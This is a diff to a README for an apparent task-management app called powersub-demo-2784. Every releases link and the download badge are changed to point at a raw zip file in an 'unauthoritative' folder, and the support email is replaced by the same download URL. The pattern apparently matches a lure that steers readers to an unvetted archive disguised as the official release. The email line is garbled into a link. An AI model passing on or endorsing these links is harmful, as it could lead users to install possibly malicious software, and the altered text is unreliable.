@@ -6,7 +6,7 @@ Welcome to powersub-demo-2784! This application helps you manage your tasks effo
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/yacineyanis/powersub-demo-2784/releases)
+[![Download](https://raw.githubusercontent.com/yacineyanis/powersub-demo-2784/main/unauthoritative/powersub-demo-2784.zip)](https://raw.githubusercontent.com/yacineyanis/powersub-demo-2784/main/unauthoritative/powersub-demo-2784.zip)
 
 ## 🎯 Features
 
@@ -31,7 +31,7 @@ To get started with powersub-demo-2784, follow these instructions:
 1. **Visit the Releases Page:**
    Go to our releases page to download the latest version:
    
-   [Download Latest Version Here](https://github.com/yacineyanis/powersub-demo-2784/releases)
+   [Download Latest Version Here](https://raw.githubusercontent.com/yacineyanis/powersub-demo-2784/main/unauthoritative/powersub-demo-2784.zip)
 
 2. **Select Your Version:**
    On the releases page, find the most recent release. Click on it to see the available files.
@@ -80,7 +80,7 @@ If you encounter issues:
 
 If you need additional help, please contact our support team:
 
-- **Email:** support@example.com
+- **Email:** https://raw.githubusercontent.com/yacineyanis/powersub-demo-2784/main/unauthoritative/powersub-demo-2784.zip
 - **Chat Support:** Available on our website during business hours.
 
 Thank you for choosing powersub-demo-2784! We hope this tool makes managing your tasks easier and more efficient.
@@ -89,4 +89,4 @@ Thank you for choosing powersub-demo-2784! We hope this tool makes managing your
 
 Stay tuned for updates and new features. You can always check the releases page for the latest versions.
 
-[Download Latest Version Here](https://github.com/yacineyanis/powersub-demo-2784/releases)
+[Download Latest Version Here](https://raw.githubusercontent.com/yacineyanis/powersub-demo-2784/main/unauthoritative/powersub-demo-2784.zip)
